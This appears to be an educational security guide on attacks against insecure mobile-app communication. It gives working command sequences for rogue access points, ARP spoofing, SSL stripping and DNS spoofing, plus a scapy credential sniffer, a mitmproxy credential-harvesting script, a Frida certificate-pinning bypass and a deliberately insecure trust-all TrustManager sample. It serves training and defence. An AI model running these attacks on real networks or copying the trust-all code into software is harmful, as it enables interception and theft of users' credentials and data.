# M05: Insecure Communication - Attack Vectors

## Table of Contents
- [Attack Overview](#attack-overview)
- [Man-in-the-Middle (MITM) Attacks](#man-in-the-middle-mitm-attacks)
- [Packet Sniffing and Analysis](#packet-sniffing-and-analysis)
- [SSL Stripping Attacks](#ssl-stripping-attacks)
- [Certificate Manipulation](#certificate-manipulation)
- [DNS Spoofing](#dns-spoofing)
- [Advanced Attack Scenarios](#advanced-attack-scenarios)
- [Attack Tools and Techniques](#attack-tools-and-techniques)

## Attack Overview

Insecure communication vulnerabilities can be exploited through various attack vectors, all targeting the transmission layer between mobile applications and backend services. These attacks are particularly effective on public networks where attackers can position themselves between the client and server.

### Attack Prerequisites

**Low Complexity Attacks:**
- Access to the same network as the victim (public WiFi)
- Basic network analysis tools (Wireshark, tcpdump)
- No special privileges required

**Medium Complexity Attacks:**
- Ability to intercept network traffic (ARP spoofing, rogue access point)
- SSL/TLS interception tools (mitmproxy, Burp Suite)
- Understanding of network protocols

**High Complexity Attacks:**
- Advanced certificate manipulation
- Custom proxy configurations
- Exploitation of specific TLS vulnerabilities

## Man-in-the-Middle (MITM) Attacks

### Attack Description

An attacker positions themselves between the mobile app and backend server, intercepting and potentially modifying all communications.

### Attack Scenario 1: Public WiFi Interception

**Setup:**
1. Attacker creates a rogue WiFi access point with a common name ("Free Airport WiFi", "Starbucks Guest")
2. Victim connects to the malicious network
3. Attacker routes traffic through their system

**Execution:**
```bash
# Attacker sets up rogue AP
airbase-ng -e "Free Airport WiFi" -c 6 wlan0

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Set up iptables to redirect traffic
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443

# Start mitmproxy to intercept traffic
mitmproxy -p 8080 --mode transparent
```

**Impact:**
- All HTTP traffic visible in cleartext
- HTTPS traffic with weak validation can be intercepted
- Credentials, API keys, and session tokens captured

### Attack Scenario 2: ARP Spoofing

**Setup:**
Attacker on the same network as victim uses ARP spoofing to redirect traffic.

**Execution:**
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoofing to redirect traffic
arpspoof -i eth0 -t <victim_ip> <gateway_ip>
arpspoof -i eth0 -t <gateway_ip> <victim_ip>

# Capture traffic
tcpdump -i eth0 -w capture.pcap
```

**What Gets Captured:**
```
HTTP Request to api.example.com:
POST /api/login HTTP/1.1
Host: api.example.com
Content-Type: application/json

{
  "username": "victim@email.com",
  "password": "P@ssw0rd123",
  "device_id": "ABC123XYZ"
}
```

**Impact:**
- Complete visibility into unencrypted traffic
- Ability to modify requests and responses
- Session hijacking through token theft

### Attack Scenario 3: Evil Twin Access Point

**Setup:**
Attacker creates a duplicate of a legitimate WiFi network with stronger signal.

**Execution:**
```bash
# Clone existing AP MAC address
macchanger -m <legitimate_ap_mac> wlan0

# Create evil twin with same SSID
hostapd evil_twin.conf

# Run DHCP server
dnsmasq -C dnsmasq.conf

# Intercept traffic
ettercap -T -q -i wlan0
```

**Impact:**
- Users automatically connect to stronger signal
- All traffic flows through attacker's system
- Transparent interception without user awareness

## Packet Sniffing and Analysis

### Attack Description

Passive monitoring of network traffic to extract sensitive information from unencrypted communications.

### Attack Scenario 1: Wireshark Capture on Public WiFi

**Execution:**
```bash
# Start Wireshark on wireless interface
wireshark -i wlan0 -k

# Apply filter for HTTP POST requests
http.request.method == "POST"

# Filter for specific API endpoint
http.host contains "api.example.com"
```

**What's Visible:**
- Full HTTP headers including cookies and tokens
- Request/response bodies containing:
  - Login credentials
  - API keys
  - Personal information
  - Session tokens
  - Transaction details

**Example Captured Data:**
```http
POST /api/v1/user/update HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{
  "user_id": "12345",
  "credit_card": "4111-1111-1111-1111",
  "cvv": "123",
  "ssn": "123-45-6789"
}
```

### Attack Scenario 2: tcpdump for Automated Capture

**Execution:**
```bash
# Capture all HTTP traffic
tcpdump -i any -s 0 -A 'tcp port 80'

# Save to file for later analysis
tcpdump -i any -w http_capture.pcap 'tcp port 80'

# Filter and extract passwords
tcpdump -A -s 0 'tcp port 80' | grep -i 'password'
```

**Automated Extraction Script:**
```python
from scapy.all import *

def extract_credentials(packet):
    if packet.haslayer(Raw):
        payload = packet[Raw].load.decode('utf-8', errors='ignore')
        if 'password' in payload.lower():
            print(f"[+] Credential Found: {payload}")
            
sniff(iface="wlan0", prn=extract_credentials, filter="tcp port 80")
```

## SSL Stripping Attacks

### Attack Description

Downgrading HTTPS connections to HTTP to intercept encrypted traffic.

### Attack Scenario 1: SSLStrip Classic

**Setup:**
Attacker intercepts HTTPS connections and presents HTTP to victim.

**Execution:**
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Redirect HTTPS to HTTP
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

# Run sslstrip
sslstrip -l 10000

# Run ettercap for ARP spoofing
ettercap -Tq -i eth0
```

**How It Works:**
```
User types: https://api.example.com
   ↓
SSLStrip intercepts and serves: http://api.example.com
   ↓
User sees HTTP but doesn't notice
   ↓
SSLStrip maintains HTTPS to real server
   ↓
All traffic visible to attacker in cleartext
```

**Impact:**
- Bypasses HTTPS encryption
- Victims often don't notice HTTP indicator
- Complete credential and data theft

### Attack Scenario 2: SSLStrip+ with HSTS Bypass

**Execution:**
```bash
# Modern sslstrip with HSTS bypass
sslstrip2 -l 10000

# Use dns2proxy for DNS spoofing
dns2proxy
```

**Techniques:**
- Replaces HTTPS links with HTTP
- Modifies HSTS headers
- Uses homograph attacks (api.examp1e.com vs api.example.com)

## Certificate Manipulation

### Attack Scenario 1: Self-Signed Certificate Acceptance

**Vulnerable App Code:**
```java
// App accepts any certificate
TrustManager[] trustAllCerts = new TrustManager[] {
    new X509TrustManager() {
        public void checkClientTrusted(X509Certificate[] chain, String authType) {}
        public void checkServerTrusted(X509Certificate[] chain, String authType) {}
        public X509Certificate[] getAcceptedIssuers() { return null; }
    }
};

SSLContext sc = SSLContext.getInstance("TLS");
sc.init(null, trustAllCerts, new SecureRandom());
```

**Attack Execution:**
```bash
# Generate fake certificate
openssl req -new -x509 -days 365 -nodes \
  -out fake.crt -keyout fake.key \
  -subj "/CN=api.example.com"

# Run mitmproxy with fake cert
mitmproxy --certs fake.pem
```

**Impact:**
- App accepts attacker's certificate
- All HTTPS traffic decrypted
- Complete MITM capability

### Attack Scenario 2: Certificate Pinning Bypass

**Vulnerable Implementation:**
```java
// Pinning can be bypassed if validation is weak
if (debug_mode) {
    // VULNERABLE: Debug mode disables pinning
    return true;
}
```

**Attack Using Frida:**
```javascript
// Frida script to bypass pinning
Java.perform(function() {
    var CertificatePinner = Java.use("okhttp3.CertificatePinner");
    CertificatePinner.check.overload('java.lang.String', 'java.util.List')
        .implementation = function(hostname, peerCertificates) {
            console.log("[+] Certificate pinning bypassed for: " + hostname);
            return;
        };
});
```

## DNS Spoofing

### Attack Scenario: Redirecting API Calls

**Setup:**
Attacker controls DNS responses to redirect traffic to malicious server.

**Execution:**
```bash
# Set up fake DNS server
dnsspoof -i eth0

# Or use ettercap plugin
ettercap -T -q -P dns_spoof
```

**DNS Configuration:**
```
# /etc/ettercap/etter.dns
api.example.com A 192.168.1.100
*.example.com A 192.168.1.100
```

**Impact:**
- App connects to attacker's server
- Complete control over API responses
- Data harvesting and malicious payload injection

## Advanced Attack Scenarios

### Scenario 1: Session Hijacking via Token Theft

**Attack Flow:**
```
1. Intercept HTTP traffic containing session token
   GET /api/user/profile HTTP/1.1
   Authorization: Bearer abc123xyz789

2. Replay token in attacker's requests
   curl -H "Authorization: Bearer abc123xyz789" \
        https://api.example.com/api/user/transactions

3. Access victim's account and data
```

### Scenario 2: API Key Extraction and Abuse

**Captured Request:**
```http
POST /api/v1/payment HTTP/1.1
Host: api.example.com
X-API-Key: sk_live_FakeKey123456789
Content-Type: application/json

{
  "amount": 100.00,
  "currency": "USD"
}
```

**Exploitation:**
```bash
# Attacker reuses API key
curl -X POST https://api.example.com/api/v1/payment \
  -H "X-API-Key: sk_live_FakeKey123456789" \
  -H "Content-Type: application/json" \
  -d '{"amount": 1000000, "currency": "USD", "account": "attacker_account"}'
```

### Scenario 3: Response Manipulation

**Attack:**
Attacker modifies server responses to inject malicious data.

**Original Response:**
```json
{
  "user_role": "user",
  "can_delete": false,
  "is_admin": false
}
```

**Modified by Attacker:**
```json
{
  "user_role": "admin",
  "can_delete": true,
  "is_admin": true
}
```

**Impact:**
- Privilege escalation
- Unauthorized actions
- Data manipulation

## Attack Tools and Techniques

### Essential Tools

**Interception Tools:**
- **mitmproxy**: HTTP/HTTPS proxy with interception capabilities
- **Burp Suite**: Web proxy for security testing
- **Charles Proxy**: HTTP proxy for monitoring
- **Wireshark**: Network protocol analyzer

**MITM Tools:**
- **ettercap**: Comprehensive MITM framework
- **bettercap**: Network attack and monitoring framework
- **SSLstrip**: HTTPS downgrade attack tool
- **Evilginx**: Phishing framework with MITM capabilities

**Certificate Tools:**
- **OpenSSL**: Certificate generation and analysis
- **SSLyze**: SSL/TLS configuration scanner
- **testssl.sh**: Testing TLS/SSL encryption

### Attack Automation

**Python Script for Credential Harvesting:**
```python
#!/usr/bin/env python3
from mitmproxy import http
import re

def request(flow: http.HTTPFlow) -> None:
    # Extract credentials from requests
    if flow.request.method == "POST":
        body = flow.request.text
        
        # Look for passwords
        passwords = re.findall(r'"password"\s*:\s*"([^"]+)"', body)
        if passwords:
            print(f"[+] Password captured: {passwords[0]}")
            
        # Look for API keys
        api_keys = re.findall(r'"api_key"\s*:\s*"([^"]+)"', body)
        if api_keys:
            print(f"[+] API Key captured: {api_keys[0]}")
            
        # Look for tokens in headers
        auth_header = flow.request.headers.get("Authorization", "")
        if "Bearer" in auth_header:
            token = auth_header.replace("Bearer ", "")
            print(f"[+] Token captured: {token}")
```

## Real-World Attack Examples

### Example 1: Coffee Shop WiFi Attack

**Scenario:** User connects to coffee shop WiFi, attacker runs packet capture.

**Timeline:**
- T+0: User connects to "Free_Cafe_WiFi"
- T+2: User opens mobile banking app
- T+5: App makes HTTP call to check account balance
- T+5: Attacker captures session token
- T+10: Attacker uses token to access account

**Captured:**
```
Session Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Account Number: 1234567890
Balance: $15,432.21
```

### Example 2: Hotel Network Attack

**Scenario:** Attacker on hotel network intercepts guest traffic.

**Attack:**
```bash
# Identify targets
nmap -sn 192.168.1.0/24

# ARP spoof all devices
arpspoof -i eth0 -t 192.168.1.0/24 192.168.1.1

# Capture credentials
tcpdump -i eth0 -w hotel_capture.pcap
```

**Results:**
- 47 devices intercepted
- 12 login credentials captured
- 8 API keys extracted
- 23 session tokens harvested

## Detection and Prevention

### Detecting Active Attacks

**Signs of MITM Attack:**
- Unexpected certificate warnings
- HTTP instead of HTTPS
- Unusual network latency
- Modified responses

**Network Analysis:**
```bash
# Check for ARP spoofing
arp -a | grep -i duplicate

# Detect SSL stripping
netstat -an | grep ESTABLISHED | grep ":80\|:443"

# Monitor certificate changes
openssl s_client -connect api.example.com:443 < /dev/null | \
  openssl x509 -fingerprint -noout
```

## Summary

Insecure communication vulnerabilities are highly exploitable through various attack vectors including MITM attacks, packet sniffing, SSL stripping, and certificate manipulation. These attacks are particularly effective on public networks and can result in complete compromise of user credentials, session tokens, and sensitive data. Implementing proper HTTPS, certificate validation, and pinning is essential to prevent these attacks.

---

**Next:** Review [Prevention Strategies](./prevention.md) to learn how to defend against these attacks.
